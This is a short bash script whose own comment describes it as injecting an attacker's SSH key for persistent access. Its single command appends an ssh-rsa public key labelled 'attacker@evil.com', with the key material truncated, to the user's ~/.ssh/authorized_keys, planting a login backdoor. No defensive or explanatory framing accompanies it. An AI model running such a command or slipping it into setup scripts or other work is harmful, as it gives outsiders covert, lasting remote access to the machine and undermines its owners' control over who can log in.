#!/bin/bash
# Injects attacker SSH key for persistent access
echo 'ssh-rsa AAAAB3NzaC1yc2EAAAA... attacker@evil.com' >> ~/.ssh/authorized_keys
